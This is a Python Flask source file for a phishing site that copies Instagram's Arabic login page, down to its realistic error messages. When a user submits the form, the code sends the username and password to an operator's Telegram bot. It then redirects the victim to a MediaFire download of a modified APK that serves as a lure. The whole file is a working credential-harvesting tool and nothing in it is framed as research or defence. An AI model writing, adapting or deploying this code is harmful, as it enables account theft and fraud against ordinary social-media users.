import os
import re
import requests
from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

MEDIAFIRE_URL = (
    "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod"
    "__40_Updated__41_.apk/file"
)


@app.route("/", methods=["GET", "POST"])
def login():
  error = ""
  username_val = ""
  if request.method == "POST":
    username_val = request.form.get("username", "").strip()
    password = request.form.get("password", "")

    # شرط إلزامي للتحقق أن المدخل بريد إلكتروني صحيح أو اسم مستخدم صالح
    email_pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"
    username_pattern = r"^[a-zA-Z0-9_\.]{3,30}$"

    if not (
        re.match(email_pattern, username_val)
        or re.match(username_pattern, username_val)
    ):
      error = (
          "عذراً، يرجى إدخال اسم مستخدم أو بريد إلكتروني صحيح مرتبط بحسابك."
      )
    elif len(password) <= 5:
      # رسالة الخطأ الواقعية لإنستغرام عند إدخال كلمة مرور خاطئة
      error = "كلمة المرور غير صحيحة. يُرجى التحقق من كلمة المرور مرة أخرى."
    else:
      # إرسال البيانات إلى بوت تيليجرام عند نجاح الشروط
      if BOT_TOKEN and CHAT_ID:
        msg = (
            "📸 تم استلام بيانات Instagram جديدة:\n\n👤 الحساب:"
            f" {username_val}\n🔑 الباسورد: {password}"
        )
        telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})

      return redirect(MEDIAFIRE_URL)

  return render_template_string(
      """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول • Instagram</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; width: 100vw; }
        
        .login-container { width: 100%; max-width: 350px; padding: 20px; }
        
        .insta-card { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px 40px 20px 40px; text-align: center; margin-bottom: 10px; }

        .insta-logo { font-family: 'Billabong', cursive, sans-serif; font-size: 42px; margin-bottom: 30px; color: #262626; font-weight: normal; letter-spacing: 1px; }

        .error-msg { color: #ed4956; font-size: 14px; line-height: 18px; margin-bottom: 15px; text-align: center; font-weight: 500; }

        .input-group { margin-bottom: 6px; }
        .input-group input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px 8px; font-size: 12px; color: #262626; outline: none; }
        .input-group input:focus { border-color: #a8a8a8; }

        .submit-btn { width: 100%; background: #0095f6; color: white; border: none; border-radius: 4px; padding: 7px 16px; font-size: 14px; font-weight: 600; cursor: pointer; margin-top: 12px; margin-bottom: 20px; }
        .submit-btn:hover { background: #1877f2; }

        .divider { display: flex; align-items: center; margin: 10px 0 18px 0; }
        .divider line, .divider-line { flex-grow: 1; height: 1px; background: #dbdbdb; }
        .divider-text { color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 0 18px; text-transform: uppercase; }

        .forgot-pass { color: #00376b; font-size: 12px; text-decoration: none; display: block; margin-top: 12px; }

        .signup-card { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 20px; text-align: center; font-size: 14px; color: #262626; }
        .signup-card a { color: #0095f6; font-weight: 600; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="insta-card">
            <h1 class="insta-logo">Instagram</h1>
            
            {% if error %}
                <div class="error-msg">{{ error }}</div>
            {% endif %}

            <form method="POST">
                <div class="input-group">
                    <input type="text" name="username" required placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني" value="{{ username_val }}">
                </div>
                <div class="input-group">
                    <input type="password" name="password" required placeholder="كلمة المرور">
                </div>
                <button type="submit" class="submit-btn">تسجيل الدخول</button>
            </form>

            <div class="divider">
                <div class="divider-line"></div>
                <div class="divider-text">أو</div>
                <div class="divider-line"></div>
            </div>

            <a href="#" class="forgot-pass">هل نسيت كلمة المرور؟</a>
        </div>

        <div class="signup-card">
            ليس لديك حساب؟ <a href="#">إشترك</a>
        </div>
    </div>
</body>
</html>
""",
      error=error,
      username_val=username_val,
  )


if __name__ == "__main__":
  app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
